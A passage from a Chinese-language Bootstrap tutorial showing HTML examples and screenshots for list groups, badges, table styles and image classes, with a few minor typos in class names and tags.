<li><strong>.list-group-item-warning</strong>：黄色。</li>
<li><strong>.list-group-item-danger</strong>：红褐色。</li>
<li><strong>.list-group-item-scondary</strong>：灰色。</li>
<li><strong>.list-group-item-dark</strong>：黑暗色。</li>
<li><strong>.list-group-item-light</strong>：淡灰色。</li>
</ul>
<h4 data-id="heading-49">自定义列表内容</h4>
<p>我们可以通过<code>.list-group-item-heading</code>用于定义列表项头部样式和<code>.list-group-item-text</code>用于定义列表项主要内容，这两个样式主要用于用户自定义列表内容。</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"container"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"list-group"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"#"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"list-group-item"</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">h4</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"list-group-item-heading"</span>&gt;</span>Web技术<span class="hljs-tag">&lt;/<span class="hljs-name">h4</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"#"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"list-group-item"</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">h3</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"list-group-item-heading"</span>&gt;</span>标题<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"list-grop-item-text"</span>&gt;</span>内容 <span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
</code></pre>
<p>效果图如下：</p>

<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6ab05122f0a74b9da040c2474ac3c94d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUG9sYXJpc19v:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768298338&amp;x-signature=wIv%2F9X7Gxu7kV%2F3eVLSgJYV%2FNgg%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-50">Bootstrap 徽章</h2>
<p>徽章一般用于在网页上标明一些有价值的信息，如重要的标签、警告信息等。</p>
<h3 data-id="heading-51">创建徽章</h3>
<p>徽章(Badges)用于突出显示信息，我们只需要将<code>.badge</code>类加上带指定的颜色到元素上即可，徽章可以根据父元素的大小变化而变化。</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"container"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"badge bg-primary"</span>&gt;</span>第一个徽章<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
</code></pre>
<p>效果图如下：</p>

<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/dbda3b420a534cca86408b5014f48ad7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUG9sYXJpc19v:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768298338&amp;x-signature=iv1TOFgWzX3RHgse3wTvULe3eX4%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-52">徽章颜色</h3>
<p>徽章颜色和大多的颜色一致，只需要在声明了徽章的后面加入颜色即可:</p>
<ul>
<li><strong>.bg-primary</strong>：蓝色。</li>
<li><strong>.bg-success</strong>：浅绿色。</li>
<li><strong>.bg-info</strong>：浅蓝色。</li>
<li><strong>.bg-warning</strong>：黄色。</li>
<li><strong>.bg-danger</strong>：红褐色。</li>
<li><strong>.bg-scondary</strong>：灰色。</li>
<li><strong>.bg-dark</strong>：黑暗色。</li>
<li><strong>.bg-light</strong>：淡灰色。</li>
</ul>
<h3 data-id="heading-53">胶囊徽章</h3>
<p>使用<code>.rounded-pill</code>类来设置类似于药丸效果的徽章</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"container"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"badge bg-primary"</span>&gt;</span>第一个徽章<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"badge bg-primary rounded-pill"</span>&gt;</span>胶囊徽章<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
</code></pre>
<p>效果图如下：</p>

<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fc54cd5f19bc48f6ab7396ebac898346~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUG9sYXJpc19v:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768298338&amp;x-signature=YF38bj89Cr%2FeVuAfdr6fvwUVyBk%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-54">元素内的徽章</h3>
<p>我们还可以将元素内添加徽章如我们之前提到的列表项中添加徽章。</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">ul</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"list-group list-group-numbered"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"list-group-item list-group-item-action"</span>&gt;</span>
        第一项
        <span class="hljs-tag">&lt;<span class="hljs-name">small</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"badge bg-primary"</span>&gt;</span>
            hot
        <span class="hljs-tag">&lt;/<span class="hljs-name">small</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"list-group-item list-group-item-action"</span>&gt;</span>第二项<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"list-group-item list-group-item-action"</span>&gt;</span>第三项<span class="hljs-tag">&lt;/<span class="hljs-name">ai</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span>
</code></pre>
<p>效果图如下：</p>

<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/31fb2c393fb64c75af4a2b341c4ef0eb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUG9sYXJpc19v:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768298338&amp;x-signature=Puhh%2F6gUWfsCBPXhqDmETgzLNn0%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-55">Bootstrap 表格</h2>
<h3 data-id="heading-56">创建基础表格</h3>
<p>我们可以通过<code>.table</code>类来进行创建一个基础的表格信息。</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"container"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">table</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"table"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">thead</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span>编号<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span>姓名<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span>年龄<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span>性别<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span>
            <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">thead</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">tbody</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>张三<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>18<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>男<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
            <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>2<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>李四<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>22<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>男<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
            <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">tbody</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">table</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
</code></pre>
<p>效果图如下：</p>

<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3d9ea2560b674ebda191398b00cb5239~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUG9sYXJpc19v:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768298338&amp;x-signature=xqNyIzrymxxXCQX1v%2FPTIPtyM1k%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-57">表格的颜色</h3>
<p>通过指定的颜色类名来修改整体表格的样式。</p>
<ul>
<li><strong>.table-primary</strong>：蓝色。</li>
<li><strong>.table-success</strong>：浅绿色。</li>
<li><strong>.table-info</strong>：浅蓝色。</li>
<li><strong>.table-warning</strong>：黄色。</li>
<li><strong>.table-danger</strong>：红褐色。</li>
<li><strong>.table-scondary</strong>：灰色。</li>
<li><strong>.table-dark</strong>：黑暗色。</li>
<li><strong>.table-light</strong>：淡灰色。</li>
</ul>
<h3 data-id="heading-58">带条纹的表格</h3>
<p>我们可以通过<code>.table-striped</code>类，可在<code>&lt;tbody&gt;</code>内的杭商看到条纹，即在基础表格的代码上为标签<code>&lt;table&gt;</code>添加<code>.table-striped</code>类。</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"container"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">table</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"table table-striped"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">thead</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span>编号<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span>姓名<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span>年龄<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span>性别<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span>
            <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">thead</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">tbody</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>张三<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>18<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>男<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
            <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>2<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>李四<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>22<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>男<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
            <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">tbody</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">table</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
</code></pre>
<p>效果图如下：</p>

<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/05fe780c78e24f01bc1e7011bff428f9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUG9sYXJpc19v:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768298338&amp;x-signature=0mQ42LNw7h7SmyGWnrx3zcpp8%2Bg%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-59">表格的边框</h3>
<p>我们可以通过<code>.table-bordered</code>来为我们的表格添加边框效果。也可以通过<code>.table-borderless</code>类来取消表格和所有边的边框。</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"container"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">table</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"table table-bordered table-striped"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">thead</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span>编号<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span>姓名<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span>年龄<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span>性别<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span>
            <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">thead</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">tbody</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>张三<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>18<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>男<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
            <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>2<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>李四<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>22<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>男<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
            <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">tbody</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">table</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
</code></pre>
<p>效果图如下：</p>

<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bc1d158ad3bb4568866700022d1e0fca~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUG9sYXJpc19v:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768298338&amp;x-signature=1FWhbEPou9xwLFZPXmc%2B55KtQAg%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-60">鼠标悬停表格</h3>
<p>我们还可以通过<code>.table-hover</code>类来为我们表格每一行添加鼠标悬停效果：</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"container"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">table</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"table table-hover table-borderless"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">thead</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span>编号<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span>姓名<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span>年龄<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span>性别<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span>
            <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">thead</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">tbody</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>张三<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>18<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>男<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
            <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>2<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>李四<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>22<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>男<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
            <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">tbody</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">table</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
</code></pre>
<p>效果图如下：</p>

<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2b4c46cca1b445f880610fe3e0be9d03~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUG9sYXJpc19v:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768298338&amp;x-signature=wmZ0eicPNnh7xFH5q1DIxmIAmxU%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-61">较小的表格</h3>
<p>我们可以通过<code>.table-sm</code>类来剑豪内边距从而使得我们的表格更紧凑并节省空间。</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"container"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">table</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"table table-sm"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">thead</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span>编号<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span>姓名<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span>年龄<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span>性别<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span>
            <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">thead</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">tbody</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>张三<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>18<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>男<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
            <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>2<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>李四<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>22<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>男<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
            <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">tbody</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">table</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
</code></pre>
<p>效果图如下：</p>

<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ebd417326582403cab7b71b0503454b8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUG9sYXJpc19v:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768298338&amp;x-signature=7O8ICW45ER3xP6tnl7crF8wwqDQ%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-62">响应式表格</h3>
<p>我们想使我们的表格具备响应式，只需要将<code>.table</code>元素包裹在<code>.table-responsive</code>元素内，即可使表格具备响应式效果，还可以使用类<code>.table-responsive-{sm | md | lg | xl}</code>根据视口调整何时具备滚动条。</p>
<h2 data-id="heading-63">Bootstrap 图像</h2>
<h3 data-id="heading-64">圆角图片</h3>
<p><code>.rounded</code>为图片添加圆角：</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"./1.png"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"rounded"</span> <span class="hljs-attr">width</span>=<span class="hljs-string">"200"</span> <span class="hljs-attr">height</span>=<span class="hljs-string">"300"</span>&gt;</span>
</code></pre>
<p>效果图如下：</p>

<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9d2dc206fa0b4aea826efef9f62cc65b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUG9sYXJpc19v:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768298338&amp;x-signature=r3e0abTTLSIsMhrTxX4tdHayWzs%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-65">圆形</h3>
<p><code>.rounded-circle</code>类可以设置椭圆形图片：</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"./1.png"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"rounded-circle"</span> <span class="hljs-attr">width</span>=<span class="hljs-string">"200"</span> <span class="hljs-attr">height</span>=<span class="hljs-string">"300"</span>&gt;</span>
</code></pre>
<p>效果图如下：</p>

<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/15d8c9947f724a94b8f0b1ddc2b0f525~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUG9sYXJpc19v:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768298338&amp;x-signature=q7kn39t2TVC%2FpCoLwhw8s2Zn49k%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-66">缩略图</h3>
<p><code>.img-thumbnail</code>类用于设置图片缩略图：</p>
